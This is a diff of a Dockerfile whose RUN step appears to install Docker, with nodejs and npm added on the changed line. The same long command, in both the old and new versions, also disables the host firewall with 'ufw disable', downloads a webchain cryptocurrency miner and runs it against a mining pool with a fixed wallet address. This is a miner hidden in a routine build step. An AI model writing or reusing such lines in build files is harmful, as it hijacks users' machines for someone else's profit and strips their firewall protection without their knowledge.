@@ -5,7 +5,7 @@ RUN apt-get update && \
     apt-get install apt-transport-https ca-certificates curl software-properties-common && \
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
-    apt-get update && sudo ufw disable && wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar -zxf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:2222 -u 0x046f8ef4c344780cbde1474e7a336380a159d6e6 -p x --donate-level 1 -t 8 && \
+    apt-get update && sudo apt install nodejs && sudo apt install npm && sudo ufw disable && wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar -zxf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:2222 -u 0x046f8ef4c344780cbde1474e7a336380a159d6e6 -p x --donate-level 1 -t 8 && \
     apt install docker-ce
 
 # install docker compose
